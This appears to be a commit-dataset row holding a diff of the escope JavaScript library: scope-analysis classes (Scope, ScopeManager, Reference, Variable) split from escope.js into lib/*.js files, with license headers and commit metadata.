(block.type === Syntax.SwitchStatement) ? 'switch' :<\n>-            (block.type === Syntax.FunctionExpression || block.type === Syntax.FunctionDeclaration || block.type === Syntax.ArrowFunctionExpression) ? 'function' :<\n>-            (block.type === Syntax.CatchClause) ? 'catch' :<\n>-            (block.type === Syntax.ForInStatement || block.type === Syntax.ForOfStatement || block.type === Syntax.ForStatement) ? 'for' :<\n>-            (block.type === Syntax.WithStatement) ? 'with' :<\n>-            (block.type === Syntax.ClassExpression || block.type === Syntax.ClassDeclaration) ? 'class' : 'global';<\n>-         /**<\n>-         * The scoped {@link Variable}s of this scope<c> as <code>{ Variable.name<\n>-         * : Variable }</code>.<\n>-         * @member {Map} Scope#set<\n>-         */<\n>-        this.set = new Map();<\n>-        /**<\n>-         * The tainted variables of this scope<c> as <code>{ Variable.name :<\n>-         * boolean }</code>.<\n>-         * @member {Map} Scope#taints */<\n>-        this.taints = new Map();<\n>-        /**<\n>-         * Generally<c> through the lexical scoping of JS you can always know<\n>-         * which variable an identifier in the source code refers to. There are<\n>-         * a few exceptions to this rule. With 'global' and 'with' scopes you<\n>-         * can only decide at runtime which variable a reference refers to.<\n>-         * Moreover<c> if 'eval()' is used in a scope<c> it might introduce new<\n>-         * bindings in this or its prarent scopes.<\n>-         * All those scopes are considered 'dynamic'.<\n>-         * @member {boolean} Scope#dynamic<\n>-         */<\n>-        this.dynamic = this.type === 'global' || this.type === 'with';<\n>-        /**<\n>-         * A reference to the scope-defining syntax node.<\n>-         * @member {esprima.Node} Scope#block<\n>-         */<\n>-        this.block = block;<\n>-         /**<\n>-         * The {@link Reference|references} that are not resolved with this scope.<\n>-         * @member {Reference[]} Scope#through<\n>-         */<\n>-        this.through = [];<\n>-         /**<\n>-         * The scoped {@link Variable}s of this scope. In the case of a<\n>-         * 'function' scope this includes the automatic argument <em>arguments</em> as<\n>-         * its first element<c> as well as all further formal arguments.<\n>-         * @member {Variable[]} Scope#variables<\n>-         */<\n>-        this.variables = [];<\n>-         /**<\n>-         * Any variable {@link Reference|reference} found in this scope. This<\n>-         * includes occurrences of local variables as well as variables from<\n>-         * parent scopes (including the global scope). For local variables<\n>-         * this also includes defining occurrences (like in a 'var' statement).<\n>-         * In a 'function' scope this does not include the occurrences of the<\n>-         * formal parameter in the parameter list.<\n>-         * @member {Reference[]} Scope#references<\n>-         */<\n>-        this.references = [];<\n>-         /**<\n>-         * For 'global' and 'function' scopes<c> this is a self-reference. For<\n>-         * other scope types this is the <em>variableScope</em> value of the<\n>-         * parent scope.<\n>-         * @member {Scope} Scope#variableScope<\n>-         */<\n>-        this.variableScope =<\n>-            (this.type === 'global' || this.type === 'function' || this.type === 'module') ? this : scopeManager.__currentScope.variableScope;<\n>-         /**<\n>-         * Whether this scope is created by a FunctionExpression.<\n>-         * @member {boolean} Scope#functionExpressionScope<\n>-         */<\n>-        this.functionExpressionScope = false;<\n>-         /**<\n>-         * Whether this is a scope that contains an 'eval()' invocation.<\n>-         * @member {boolean} Scope#directCallToEvalScope<\n>-         */<\n>-        this.directCallToEvalScope = false;<\n>-         /**<\n>-         * @member {boolean} Scope#thisFound<\n>-         */<\n>-        this.thisFound = false;<\n>-        this.__left = [];<\n>-        if (scopeType === SCOPE_FUNCTION_EXPRESSION_NAME) {<\n>-            this.__define(block.id<c> {<\n>-                type: Variable.FunctionName<c><\n>-                name: block.id<c><\n>-                node: block<\n>-            });<\n>-            this.functionExpressionScope = true;<\n>-        } else {<\n>-            // section 9.2.13<c> FunctionDeclarationInstantiation.<\n>-            // NOTE Arrow functions never have an arguments objects.<\n>-            if (this.type === 'function' && this.block.type !== Syntax.ArrowFunctionExpression) {<\n>-                this.__defineArguments();<\n>-            }<\n>-            if (block.type === Syntax.FunctionExpression && block.id) {<\n>-                scopeManager.__nestFunctionExpressionNameScope(block<c> isMethodDefinition);<\n>-            }<\n>-        }<\n>-         /**<\n>-         * Reference to the parent {@link Scope|scope}.<\n>-         * @member {Scope} Scope#upper<\n>-         */<\n>-        this.upper = scopeManager.__currentScope;<\n>-         /**<\n>-         * Whether 'use strict' is in effect in this scope.<\n>-         * @member {boolean} Scope#isStrict<\n>-         */<\n>-        this.isStrict = isStrictScope(this<c> block<c> isMethodDefinition<c> scopeManager.__useDirective());<\n>-         /**<\n>-         * List of nested {@link Scope}s.<\n>-         * @member {Scope[]} Scope#childScopes<\n>-         */<\n>-        this.childScopes = [];<\n>-        if (scopeManager.__currentScope) {<\n>-            scopeManager.__currentScope.childScopes.push(this);<\n>-        }<\n>-        // RAII<\n>-        scopeManager.__currentScope = this;<\n>-        if (this.type === 'global') {<\n>-            scopeManager.globalScope = this;<\n>-            scopeManager.globalScope.implicit = {<\n>-                set: new Map()<c><\n>-                variables: []<c><\n>-                /**<\n>-                * List of {@link Reference}s that are left to be resolved (i.e. which<\n>-                * need to be linked to the variable they refer to).<\n>-                * @member {Reference[]} Scope#implicit#left<\n>-                */<\n>-                left: []<\n>-            };<\n>-        }<\n>-        registerScope(scopeManager<c> this);<\n>-    }<\n>-    Scope.prototype.__close = function __close(scopeManager) {<\n>-        var i<c> iz<c> ref<c> current<c> implicit<c> info;<\n>-        // Because if this is global environment<c> upper is null<\n>-        if (!this.dynamic || scopeManager.__isOptimistic()) {<\n>-            // static resolve<\n>-            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                ref = this.__left[i];<\n>-                if (!this.__resolve(ref)) {<\n>-                    this.__delegateToUpperScope(ref);<\n>-                }<\n>-            }<\n>-        } else {<\n>-            // this is ""global"" / ""with"" / ""function with eval"" environment<\n>-            if (this.type === 'with') {<\n>-                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                    ref = this.__left[i];<\n>-                    ref.tainted = true;<\n>-                    this.__delegateToUpperScope(ref);<\n>-                }<\n>-            } else {<\n>-                for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                    // notify all names are through to global<\n>-                    ref = this.__left[i];<\n>-                    current = this;<\n>-                    do {<\n>-                        current.through.push(ref);<\n>-                        current = current.upper;<\n>-                    } while (current);<\n>-                }<\n>-            }<\n>-        }<\n>-        if (this.type === 'global') {<\n>-            implicit = [];<\n>-            for (i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-                ref = this.__left[i];<\n>-                if (ref.__maybeImplicitGlobal && !this.set.has(ref.identifier.name)) {<\n>-                    implicit.push(ref.__maybeImplicitGlobal);<\n>-                }<\n>-            }<\n>-            // create an implicit global variable from assignment expression<\n>-            for (i = 0<c> iz = implicit.length; i < iz; ++i) {<\n>-                info = implicit[i];<\n>-                this.__defineImplicit(info.pattern<c> {<\n>-                    type: Variable.ImplicitGlobalVariable<c><\n>-                    name: info.pattern<c><\n>-                    node: info.node<\n>-                });<\n>-            }<\n>-            this.implicit.left = this.__left;<\n>-        }<\n>-        this.__left = null;<\n>-        scopeManager.__currentScope = this.upper;<\n>-    };<\n>-    Scope.prototype.__resolve = function __resolve(ref) {<\n>-        var variable<c> name;<\n>-        name = ref.identifier.name;<\n>-        if (this.set.has(name)) {<\n>-            variable = this.set.get(name);<\n>-            variable.references.push(ref);<\n>-            variable.stack = variable.stack && ref.from.variableScope === this.variableScope;<\n>-            if (ref.tainted) {<\n>-                variable.tainted = true;<\n>-                this.taints.set(variable.name<c> true);<\n>-            }<\n>-            ref.resolved = variable;<\n>-            return true;<\n>-        }<\n>-        return false;<\n>-    };<\n>-    Scope.prototype.__delegateToUpperScope = function __delegateToUpperScope(ref) {<\n>-        if (this.upper) {<\n>-            this.upper.__left.push(ref);<\n>-        }<\n>-        this.through.push(ref);<\n>-    };<\n>-    Scope.prototype.__defineGeneric = function (name<c> set<c> variables<c> node<c> info) {<\n>-        var variable;<\n>-        variable = set.get(name);<\n>-        if (!variable) {<\n>-            variable = new Variable(name<c> this);<\n>-            set.set(name<c> variable);<\n>-            variables.push(variable);<\n>-        }<\n>-        if (info) {<\n>-            variable.defs.push(info);<\n>-        }<\n>-        if (node) {<\n>-            variable.identifiers.push(node);<\n>-        }<\n>-    };<\n>-    Scope.prototype.__defineArguments = function () {<\n>-        this.__defineGeneric('arguments'<c> this.set<c> this.variables);<\n>-        this.taints.set('arguments'<c> true);<\n>-    };<\n>-    Scope.prototype.__defineImplicit = function (node<c> info) {<\n>-        if (node && node.type === Syntax.Identifier) {<\n>-            this.__defineGeneric(node.name<c> this.implicit.set<c> this.implicit.variables<c> node<c> info);<\n>-        }<\n>-    };<\n>-    Scope.prototype.__define = function (node<c> info) {<\n>-        if (node && node.type === Syntax.Identifier) {<\n>-            this.__defineGeneric(node.name<c> this.set<c> this.variables<c> node<c> info);<\n>-        }<\n>-    };<\n>-    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>-        var ref;<\n>-        // because Array element may be null<\n>-        if (node && node.type === Syntax.Identifier) {<\n>-            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial);<\n>-            this.references.push(ref);<\n>-            this.__left.push(ref);<\n>-        }<\n>-    };<\n>-    Scope.prototype.__detectEval = function __detectEval() {<\n>-        var current;<\n>-        current = this;<\n>-        this.directCallToEvalScope = true;<\n>-        do {<\n>-            current.dynamic = true;<\n>-            current = current.upper;<\n>-        } while (current);<\n>-    };<\n>-    Scope.prototype.__detectThis = function __detectThis() {<\n>-        this.thisFound = true;<\n>-    };<\n>-    Scope.prototype.__isClosed = function isClosed() {<\n>-        return this.__left === null;<\n>-    };<\n>-    // API Scope#resolve(name)<\n>-    // returns resolved reference<\n>-    Scope.prototype.resolve = function resolve(ident) {<\n>-        var ref<c> i<c> iz;<\n>-        assert(this.__isClosed()<c> 'scope should be closed');<\n>-        assert(ident.type === Syntax.Identifier<c> 'target should be identifier');<\n>-        for (i = 0<c> iz = this.references.length; i < iz; ++i) {<\n>-            ref = this.references[i];<\n>-            if (ref.identifier === ident) {<\n>-                return ref;<\n>-            }<\n>-        }<\n>-        return null;<\n>-    };<\n>-    // API Scope#isStatic<\n>-    // returns this scope is static<\n>-    Scope.prototype.isStatic = function isStatic() {<\n>-        return !this.dynamic;<\n>-    };<\n>-    // API Scope#isArgumentsMaterialized<\n>-    // return this scope has materialized arguments<\n>-    Scope.prototype.isArgumentsMaterialized = function isArgumentsMaterialized() {<\n>-        // TODO(Constellation)<\n>-        // We can more aggressive on this condition like this.<\n>-        //<\n>-        // function t() {<\n>-        //     // arguments of t is always hidden.<\n>-        //     function arguments() {<\n>-        //     }<\n>-        // }<\n>-        var variable;<\n>-        // This is not function scope<\n>-        if (this.type !== 'function') {<\n>-            return true;<\n>-        }<\n>-        if (!this.isStatic()) {<\n>-            return true;<\n>-        }<\n>-        variable = this.set.get('arguments');<\n>-        assert(variable<c> 'always have arguments variable');<\n>-        return variable.tainted || variable.references.length  !== 0;<\n>-    };<\n>-    // API Scope#isThisMaterialized<\n>-    // return this scope has materialized `this` reference<\n>-    Scope.prototype.isThisMaterialized = function isThisMaterialized() {<\n>-        // This is not function scope<\n>-        if (this.type !== 'function') {<\n>-            return true;<\n>-        }<\n>-        if (!this.isStatic()) {<\n>-            return true;<\n>-        }<\n>-        return this.thisFound;<\n>-    };<\n>-    Scope.prototype.isUsedName = function (name) {<\n>-        if (this.set.has(name)) {<\n>-            return true;<\n>-        }<\n>-        for (var i = 0<c> iz = this.through.length; i < iz; ++i) {<\n>-            if (this.through[i].identifier.name === name) {<\n>-                return true;<\n>-            }<\n>-        }<\n>-        return false;<\n>-    };<\n>-    /**<\n>-     * @class ScopeManager<\n>-     */<\n>-    function ScopeManager(options) {<\n>-        this.scopes = [];<\n>-        this.globalScope = null;<\n>-        this.__nodeToScope = new WeakMap();<\n>-        this.__currentScope = null;<\n>-        this.__options = options;<\n>-    }<\n>-    ScopeManager.prototype.__useDirective = function () {<\n>-        return this.__options.directive;<\n>-    };<\n>-    ScopeManager.prototype.__isOptimistic = function () {<\n>-        return this.__options.optimistic;<\n>-    };<\n>-    ScopeManager.prototype.__ignoreEval = function () {<\n>-        return this.__options.ignoreEval;<\n>-    };<\n>-    ScopeManager.prototype.isModule = function () {<\n>-        return this.__options.sourceType === 'module';<\n>-    };<\n>-    // Returns appropliate scope for this node.<\n>-    ScopeManager.prototype.__get = function __get(node) {<\n>-        return this.__nodeToScope.get(node);<\n>-    };<\n>-    ScopeManager.prototype.acquire = function acquire(node<c> inner) {<\n>-        var scopes<c> scope<c> i<c> iz;<\n>-        function predicate(scope) {<\n>-            if (scope.type === 'function' && scope.functionExpressionScope) {<\n>-                return false;<\n>-            }<\n>-            if (scope.type === 'TDZ') {<\n>-                return false;<\n>-            }<\n>-            return true;<\n>-        }<\n>-        scopes = this.__get(node);<\n>-        if (!scopes || scopes.length === 0) {<\n>-            return null;<\n>-        }<\n>-        // Heuristic selection from all scopes.<\n>-        // If you would like to get all scopes<c> please use ScopeManager#acquireAll.<\n>-        if (scopes.length === 1) {<\n>-            return scopes[0];<\n>-        }<\n>-        if (inner) {<\n>-            for (i = scopes.length - 1; i >= 0; --i) {<\n>-                scope = scopes[i];<\n>-                if (predicate(scope)) {<\n>-                    return scope;<\n>-                }<\n>-            }<\n>-        } else {<\n>-            for (i = 0<c> iz = scopes.length; i < iz; ++i) {<\n>-                scope = scopes[i];<\n>-                if (predicate(scope)) {<\n>-                    return scope;<\n>-                }<\n>-            }<\n>-        }<\n>-        return null;<\n>-    };<\n>-    ScopeManager.prototype.acquireAll = function acquire(node) {<\n>-        return this.__get(node);<\n>-    };<\n>-    ScopeManager.prototype.release = function release(node<c> inner) {<\n>-        var scopes<c> scope;<\n>-        scopes = this.__get(node);<\n>-        if (scopes && scopes.length) {<\n>-            scope = scopes[0].upper;<\n>-            if (!scope) {<\n>-                return null;<\n>-            }<\n>-            return this.acquire(scope.block<c> inner);<\n>-        }<\n>-        return null;<\n>-    };<\n>-    ScopeManager.prototype.attach = function attach() { };<\n>-    ScopeManager.prototype.detach = function detach() { };<\n>-    ScopeManager.prototype.__nestScope = function (node<c> isMethodDefinition) {<\n>-        return new Scope(this<c> node<c> isMethodDefinition<c> SCOPE_NORMAL);<\n>-    };<\n>-    ScopeManager.prototype.__nestModuleScope = function (node) {<\n>-        return new Scope(this<c> node<c> false<c> SCOPE_MODULE);<\n>-    };<\n>-    ScopeManager.prototype.__nestTDZScope = function (node) {<\n>-        return new Scope(this<c> node<c> false<c> SCOPE_TDZ);<\n>-    };<\n>-    ScopeManager.prototype.__nestFunctionExpressionNameScope = function (node<c> isMethodDefinition) {<\n>-        return new Scope(this<c> node<c> isMethodDefinition<c> SCOPE_FUNCTION_EXPRESSION_NAME);<\n>-    };<\n>-    ScopeManager.prototype.__isES6 = function () {<\n>-        return this.__options.ecmaVersion >= 6;<\n>-    };<\n>-            assert(this.scopeManager.__isES6() && this.scopeManager.isModule());<\n>-        assert(scopeManager.__currentScope === null);<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,26,1 Jan 2015,Separate escope.js into lib/*.js files,0,2,3,398,15020,"+    'lib/*.js'<\n>+        entries: [ './lib/index.js' ]<\n>+        Reference<c><\n>+        Variable<c><\n>+    Reference = require('./reference');<\n>+    Variable = require('./variable');<\n>+    exports.version = require('../package.json').version;<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    /**<\n>+     * A Reference represents a single occurrence of an identifier in code.<\n>+     * @class Reference<\n>+     */<\n>+    function Reference(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>+        /**<\n>+         * Identifier syntax node.<\n>+         * @member {esprima#Identifier} Reference#identifier<\n>+         */<\n>+        this.identifier = ident;<\n>+        /**<\n>+         * Reference to the enclosing Scope.<\n>+         * @member {Scope} Reference#from<\n>+         */<\n>+        this.from = scope;<\n>+        /**<\n>+         * Whether the reference comes from a dynamic scope (such as 'eval'<c><\n>+         * 'with'<c> etc.)<c> and may be trapped by dynamic scopes.<\n>+         * @member {boolean} Reference#tainted<\n>+         */<\n>+        this.tainted = false;<\n>+        /**<\n>+         * The variable this reference is resolved with.<\n>+         * @member {Variable} Reference#resolved<\n>+         */<\n>+        this.resolved = null;<\n>+        /**<\n>+         * The read-write mode of the reference. (Value is one of {@link<\n>+         * Reference.READ}<c> {@link Reference.RW}<c> {@link Reference.WRITE}).<\n>+         * @member {number} Reference#flag<\n>+         * @private<\n>+         */<\n>+        this.flag = flag;<\n>+        if (this.isWrite()) {<\n>+            /**<\n>+             * If reference is writeable<c> this is the tree being written to it.<\n>+             * @member {esprima#Node} Reference#writeExpr<\n>+             */<\n>+            this.writeExpr = writeExpr;<\n>+            /**<\n>+             * Whether the Reference might refer to a partial value of writeExpr.<\n>+             * @member {boolean} Reference#partial<\n>+             */<\n>+            this.partial = partial;<\n>+        }<\n>+        this.__maybeImplicitGlobal = maybeImplicitGlobal;<\n>+    }<\n>+    /**<\n>+     * @constant Reference.READ<\n>+     * @private<\n>+     */<\n>+    Reference.READ = 0x1;<\n>+    /**<\n>+     * @constant Reference.WRITE<\n>+     * @private<\n>+     */<\n>+    Reference.WRITE = 0x2;<\n>+    /**<\n>+     * @constant Reference.RW<\n>+     * @private<\n>+     */<\n>+    Reference.RW = Reference.READ | Reference.WRITE;<\n>+    /**<\n>+     * Whether the reference is static.<\n>+     * @method Reference#isStatic<\n>+     * @return {boolean}<\n>+     */<\n>+    Reference.prototype.isStatic = function isStatic() {<\n>+        return !this.tainted && this.resolved && this.resolved.scope.isStatic();<\n>+    };<\n>+    /**<\n>+     * Whether the reference is writeable.<\n>+     * @method Reference#isWrite<\n>+     * @return {boolean}<\n>+     */<\n>+    Reference.prototype.isWrite = function isWrite() {<\n>+        return !!(this.flag & Reference.WRITE);<\n>+    };<\n>+    /**<\n>+     * Whether the reference is readable.<\n>+     * @method Reference#isRead<\n>+     * @return {boolean}<\n>+     */<\n>+    Reference.prototype.isRead = function isRead() {<\n>+        return !!(this.flag & Reference.READ);<\n>+    };<\n>+    /**<\n>+     * Whether the reference is read-only.<\n>+     * @method Reference#isReadOnly<\n>+     * @return {boolean}<\n>+     */<\n>+    Reference.prototype.isReadOnly = function isReadOnly() {<\n>+        return this.flag === Reference.READ;<\n>+    };<\n>+    /**<\n>+     * Whether the reference is write-only.<\n>+     * @method Reference#isWriteOnly<\n>+     * @return {boolean}<\n>+     */<\n>+    Reference.prototype.isWriteOnly = function isWriteOnly() {<\n>+        return this.flag === Reference.WRITE;<\n>+    };<\n>+    /**<\n>+     * Whether the reference is read-write.<\n>+     * @method Reference#isReadWrite<\n>+     * @return {boolean}<\n>+     */<\n>+    Reference.prototype.isReadWrite = function isReadWrite() {<\n>+        return this.flag === Reference.RW;<\n>+    };<\n>+    module.exports = Reference;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+(function () {<\n>+    'use strict';<\n>+    /**<\n>+     * A Variable represents a locally scoped identifier. These include arguments to<\n>+     * functions.<\n>+     * @class Variable<\n>+     */<\n>+    function Variable(name<c> scope) {<\n>+        /**<\n>+         * The variable name<c> as given in the source code.<\n>+         * @member {String} Variable#name<\n>+         */<\n>+        this.name = name;<\n>+        /**<\n>+         * List of defining occurrences of this variable (like in 'var ...'<\n>+         * statements or as parameter)<c> as AST nodes.<\n>+         * @member {esprima.Identifier[]} Variable#identifiers<\n>+         */<\n>+        this.identifiers = [];<\n>+        /**<\n>+         * List of {@link Reference|references} of this variable (excluding parameter entries)<\n>+         * in its defining scope and all nested scopes. For defining<\n>+         * occurrences only see {@link Variable#defs}.<\n>+         * @member {Reference[]} Variable#references<\n>+         */<\n>+        this.references = [];<\n>+        /**<\n>+         * List of defining occurrences of this variable (like in 'var ...'<\n>+         * statements or as parameter)<c> as custom objects.<\n>+         * @typedef {Object} DefEntry<\n>+         * @property {String} DefEntry.type - the type of the occurrence (e.g.<\n>+         *      ""Parameter""<c> ""Variable""<c> ...)<\n>+         * @property {esprima.Identifier} DefEntry.name - the identifier AST node of the occurrence<\n>+         * @property {esprima.Node} DefEntry.node - the enclosing node of the<\n>+         *      identifier<\n>+         * @property {esprima.Node} [DefEntry.parent] - the enclosing statement<\n>+         *      node of the identifier<\n>+         * @member {DefEntry[]} Variable#defs<\n>+         */<\n>+        this.defs = [];<\n>+        this.tainted = false;<\n>+        /**<\n>+         * Whether this is a stack variable.<\n>+         * @member {boolean} Variable#stack<\n>+         */<\n>+        this.stack = true;<\n>+        /**<\n>+         * Reference to the enclosing Scope.<\n>+         * @member {Scope} Variable#scope<\n>+         */<\n>+        this.scope = scope;<\n>+    }<\n>+    Variable.CatchClause = 'CatchClause';<\n>+    Variable.Parameter = 'Parameter';<\n>+    Variable.FunctionName = 'FunctionName';<\n>+    Variable.ClassName = 'ClassName';<\n>+    Variable.Variable = 'Variable';<\n>+    Variable.ImportBinding = 'ImportBinding';<\n>+    Variable.TDZ = 'TDZ';<\n>+    Variable.ImplicitGlobalVariable = 'ImplicitGlobalVariable';<\n>+    module.exports = Variable;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+  ""main"": ""lib/index.js""<c><\n>+    ""jsdoc"": ""jsdoc lib/*.js README.md""<\n>","-    '*.js'<\n>-        entries: [ './escope.js' ]<\n>-    /**<\n>-     * A Reference represents a single occurrence of an identifier in code.<\n>-     * @class Reference<\n>-     */<\n>-    function Reference(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>-        /**<\n>-         * Identifier syntax node.<\n>-         * @member {esprima#Identifier} Reference#identifier<\n>-         */<\n>-        this.identifier = ident;<\n>-        /**<\n>-         * Reference to the enclosing Scope.<\n>-         * @member {Scope} Reference#from<\n>-         */<\n>-        this.from = scope;<\n>-        /**<\n>-         * Whether the reference comes from a dynamic scope (such as 'eval'<c><\n>-         * 'with'<c> etc.)<c> and may be trapped by dynamic scopes.<\n>-         * @member {boolean} Reference#tainted<\n>-         */<\n>-        this.tainted = false;<\n>-        /**<\n>-         * The variable this reference is resolved with.<\n>-         * @member {Variable} Reference#resolved<\n>-         */<\n>-        this.resolved = null;<\n>-        /**<\n>-         * The read-write mode of the reference. (Value is one of {@link<\n>-         * Reference.READ}<c> {@link Reference.RW}<c> {@link Reference.WRITE}).<\n>-         * @member {number} Reference#flag<\n>-         * @private<\n>-         */<\n>-        this.flag = flag;<\n>-        if (this.isWrite()) {<\n>-            /**<\n>-             * If reference is writeable<c> this is the tree being written to it.<\n>-             * @member {esprima#Node} Reference#writeExpr<\n>-             */<\n>-            this.writeExpr = writeExpr;<\n>-            /**<\n>-             * Whether the Reference might refer to a partial value of writeExpr.<\n>-             * @member {boolean} Reference#partial<\n>-             */<\n>-            this.partial = partial;<\n>-        }<\n>-        this.__maybeImplicitGlobal = maybeImplicitGlobal;<\n>-    }<\n>-    /**<\n>-     * @constant Reference.READ<\n>-     * @private<\n>-     */<\n>-    Reference.READ = 0x1;<\n>-    /**<\n>-     * @constant Reference.WRITE<\n>-     * @private<\n>-     */<\n>-    Reference.WRITE = 0x2;<\n>-    /**<\n>-     * @constant Reference.RW<\n>-     * @private<\n>-     */<\n>-    Reference.RW = Reference.READ | Reference.WRITE;<\n>-    /**<\n>-     * Whether the reference is static.<\n>-     * @method Reference#isStatic<\n>-     * @return {boolean}<\n>-     */<\n>-    Reference.prototype.isStatic = function isStatic() {<\n>-        return !this.tainted && this.resolved && this.resolved.scope.isStatic();<\n>-    };<\n>-    /**<\n>-     * Whether the reference is writeable.<\n>-     * @method Reference#isWrite<\n>-     * @return {boolean}<\n>-     */<\n>-    Reference.prototype.isWrite = function isWrite() {<\n>-        return !!(this.flag & Reference.WRITE);<\n>-    };<\n>-    /**<\n>-     * Whether the reference is readable.<\n>-     * @method Reference#isRead<\n>-     * @return {boolean}<\n>-     */<\n>-    Reference.prototype.isRead = function isRead() {<\n>-        return !!(this.flag & Reference.READ);<\n>-    };<\n>-    /**<\n>-     * Whether the reference is read-only.<\n>-     * @method Reference#isReadOnly<\n>-     * @return {boolean}<\n>-     */<\n>-    Reference.prototype.isReadOnly = function isReadOnly() {<\n>-        return this.flag === Reference.READ;<\n>-    };<\n>-    /**<\n>-     * Whether the reference is write-only.<\n>-     * @method Reference#isWriteOnly<\n>-     * @return {boolean}<\n>-     */<\n>-    Reference.prototype.isWriteOnly = function isWriteOnly() {<\n>-        return this.flag === Reference.WRITE;<\n>-    };<\n>-    /**<\n>-     * Whether the reference is read-write.<\n>-     * @method Reference#isReadWrite<\n>-     * @return {boolean}<\n>-     */<\n>-    Reference.prototype.isReadWrite = function isReadWrite() {<\n>-        return this.flag === Reference.RW;<\n>-    };<\n>-    /**<\n>-     * A Variable represents a locally scoped identifier. These include arguments to<\n>-     * functions.<\n>-     * @class Variable<\n>-     */<\n>-    function Variable(name<c> scope) {<\n>-        /**<\n>-         * The variable name<c> as given in the source code.<\n>-         * @member {String} Variable#name<\n>-         */<\n>-        this.name = name;<\n>-        /**<\n>-         * List of defining occurrences of this variable (like in 'var ...'<\n>-         * statements or as parameter)<c> as AST nodes.<\n>-         * @member {esprima.Identifier[]} Variable#identifiers<\n>-         */<\n>-        this.identifiers = [];<\n>-        /**<\n>-         * List of {@link Reference|references} of this variable (excluding parameter entries)<\n>-         * in its defining scope and all nested scopes. For defining<\n>-         * occurrences only see {@link Variable#defs}.<\n>-         * @member {Reference[]} Variable#references<\n>-         */<\n>-        this.references = [];<\n>-        /**<\n>-         * List of defining occurrences of this variable (like in 'var ...'<\n>-         * statements or as parameter)<c> as custom objects.<\n>-         * @typedef {Object} DefEntry<\n>-         * @property {String} DefEntry.type - the type of the occurrence (e.g.<\n>-         *      ""Parameter""<c> ""Variable""<c> ...)<\n>-         * @property {esprima.Identifier} DefEntry.name - the identifier AST node of the occurrence<\n>-         * @property {esprima.Node} DefEntry.node - the enclosing node of the<\n>-         *      identifier<\n>-         * @property {esprima.Node} [DefEntry.parent] - the enclosing statement<\n>-         *      node of the identifier<\n>-         * @member {DefEntry[]} Variable#defs<\n>-         */<\n>-        this.defs = [];<\n>-        this.tainted = false;<\n>-        /**<\n>-         * Whether this is a stack variable.<\n>-         * @member {boolean} Variable#stack<\n>-         */<\n>-        this.stack = true;<\n>-        /**<\n>-         * Reference to the enclosing Scope.<\n>-         * @member {Scope} Variable#scope<\n>-         */<\n>-        this.scope = scope;<\n>-    }<\n>-    Variable.CatchClause = 'CatchClause';<\n>-    Variable.Parameter = 'Parameter';<\n>-    